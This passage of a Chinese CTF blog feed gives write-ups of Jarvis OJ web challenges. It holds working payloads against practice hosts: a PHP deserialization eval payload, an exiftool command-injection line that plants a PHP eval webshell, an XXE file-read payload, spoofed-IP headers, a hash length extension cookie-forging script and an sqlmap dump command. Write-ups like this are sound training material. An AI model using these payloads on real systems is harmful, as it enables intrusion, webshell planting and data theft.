class=&quot;string&quot;&gt;&quot;kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg=&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cipher.decrypt(msg)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对于zip压缩包，还是archpr好用。。&lt;/p&gt;
&lt;p&gt;对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。&lt;/p&gt;
&lt;p&gt;对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）&lt;/p&gt;
&lt;p&gt;rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）&lt;/p&gt;
&lt;p&gt;线下赛的web waf需要完善。&lt;/p&gt;
&lt;p&gt;新的pyc加密方式  &lt;code&gt;stegosaurus&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;writeup 如下&lt;br&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>【web】jarvis oj 刷题</title>
    <link href="https://winter3un.github.io/2017/06/17/jarvisoj-web/"/>
    <id>https://winter3un.github.io/2017/06/17/jarvisoj-web/</id>
    <published>2017-06-17T14:13:07.000Z</published>
    <updated>2017-07-08T15:30:58.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web？"><a href="#web？" class="headerlink" title="web？"></a>web？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> np</div><div class="line">o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]]</div><div class="line">r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>]</div><div class="line">o = np.array(o)</div><div class="line">r = np.array(r)</div><div class="line">x = np.linalg.solve(o,r)</div><div class="line"><span class="keyword">print</span> x</div><div class="line">string = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</div><div class="line">    string += chr(int(str(i)[<span class="number">0</span>:<span class="number">-2</span>]))</div><div class="line"><span class="keyword">print</span> string</div></pre></td></tr></table></figure><a id="more"></a><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>反序列化漏洞，比较新的一点是利用了php upload过程中的session来进行漏洞利用。</p><p>html构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure><p>几个payload </p><p><code>print_r(dirname(__FILE__));</code><br><code>print_r(scandir(dirname(__FILE__)));</code><br><code>print_r(file_get_contents(&quot;Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code><br>序列化payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</div><div class="line">session_start();</div><div class="line">class OowoO</div><div class="line">&#123;</div><div class="line">    public $mdzz;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function __destruct()</div><div class="line">    &#123;</div><div class="line">        eval($this-&gt;mdzz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$m = new OowoO();</div><div class="line">$m-&gt;mdzz = &quot;print_r(dirname(__FILE__));&quot;; </div><div class="line"></div><div class="line">echo serialize($m);</div><div class="line">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(__FILE__));&quot;;&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>ps: </p><p>参考资料<br>PHP Session 序列化及反序列化处理器 <a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>cve漏洞 imagick</p><p><code>exiftool -label=&quot;\&quot;|/usr/bin/id; \&quot;&quot; imagick.png</code></p><p>shell</p><p><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[a\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/1.php; \&quot;&quot; imagick.png</code></p><p><code>CTF{873dfee87823248f4a1657650204697a}</code></p><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>一开始一脸懵比。。。</p><p>原来是XXE攻击</p><p>payload一发带走</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;search&gt;name&lt;/search&gt;</div><div class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>考点：文件包含漏洞</p><p>1、泄露源码</p><p>但是关键字符被waf挡住了。</p><p>上传图片马</p><p><code>uploads/1497485980.gif</code></p><p>还是被waf拦截了，使用<code>&lt;script&gt;</code>绕过</p><p><code>CTF{upl0ad_sh0uld_n07_b3_a110wed}</code></p><h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>考察点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 127.0.0.1</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">X-Remote-IP: 127.0.0.1</div><div class="line">X-Remote-Addr: 127.0.0.1</div><div class="line">X-Client-IP: 127.0.0.1</div></pre></td></tr></table></figure></p><p>ssrf中ip.src的构建。</p><p>信息获取能力</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">robots.txt</div><div class="line">.index.php.swp</div><div class="line">.index.php.swo</div><div class="line">index.txt</div><div class="line">index.bak</div><div class="line">index.php~</div><div class="line">test.php</div><div class="line">index.phps</div><div class="line">phpinfo.php</div></pre></td></tr></table></figure><p>在robots.txt中找到线索。在burp repeater中，change action method 使get变成post，成功执行。</p><p><code>CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</code></p><h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>考察点：</p><p>信息获取能力</p><p>vim缓存文件恢复 <code>vim -r index.php</code></p><p>哈希长度扩展攻击</p><p>可利用工具：</p><p><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">https://github.com/iagox86/hash_extender</a></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,os,urllib</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">cmd = <span class="string">'./hash_extender -d ";\\"tseug\\":5:s" -s "3a4727d57463f122833d9e732f94e4e0" -a ";\\"nimda\\":5:s"  -f md5 --out-data-format=html -q -l '</span>+str(x)</div><div class="line"><span class="comment"># print cmd</span></div><div class="line">p = os.popen(cmd).read()</div><div class="line"><span class="comment"># break</span></div><div class="line">url = <span class="string">"http://web.jarvisoj.com:32778/"</span></div><div class="line">payload = <span class="string">"__cfduid=d08f46c0f9fbc7e86bab05b2d091bb7c81496549709; UM_distinctid=15c715066e3a8a-0f985be0b8ac06-5393662-1fa400-15c715066e4104b; "</span></div><div class="line">payload += <span class="string">"hsh="</span>+p[:<span class="number">32</span>]+<span class="string">";"</span></div><div class="line"></div><div class="line">payload +=<span class="string">"role="</span>+urllib.quote(urllib.unquote(p[<span class="number">32</span>:])[::<span class="number">-1</span>])+<span class="string">";"</span></div><div class="line"><span class="comment"># print payload</span></div><div class="line"><span class="comment"># break</span></div><div class="line">head = &#123;<span class="string">"Cookie"</span>:payload&#125;</div><div class="line"></div><div class="line"></div><div class="line">data = requests.get(url=url,headers=head).content</div><div class="line"><span class="keyword">if</span> len(data) != <span class="number">210</span>:</div><div class="line"><span class="keyword">print</span> data</div></pre></td></tr></table></figure><p>参考资料：</p><p><a href="https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90" target="_blank" rel="external">https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90</a></p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>逆向思路。。gdb调试一波，拿到flag。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">//动态链接库路径</div><div class="line">#define LIB_CACULATE_PATH &quot;./udf.so&quot;</div><div class="line"></div><div class="line">//函数指针</div><div class="line">typedef int (*CAC_FUNC)();</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    void *handle;</div><div class="line">    char *error;</div><div class="line">    CAC_FUNC cac_func = NULL;</div><div class="line"></div><div class="line">    //打开动态链接库</div><div class="line">    handle = dlopen(LIB_CACULATE_PATH, RTLD_LAZY);</div><div class="line">    if (!handle) &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, dlerror());</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    //清除之前存在的错误</div><div class="line">    dlerror();</div><div class="line"></div><div class="line">    //获取一个函数</div><div class="line">    *(void **) (&amp;cac_func) = dlsym(handle, &quot;getflag&quot;);</div><div class="line">    if ((error = dlerror()) != NULL)  &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, error);</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line">    (*cac_func)();</div><div class="line">    dlclose(handle);</div><div class="line">    exit(EXIT_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line">gcc -rdynamic -o main main.c -ldl</div></pre></td></tr></table></figure><h3 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h3><p><code>sqlmap -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --data &quot;username=123&amp;password=123&quot; --tamper=space2comment -D injection --dump</code></p>]]></content>
    
    <summary type="html">
    
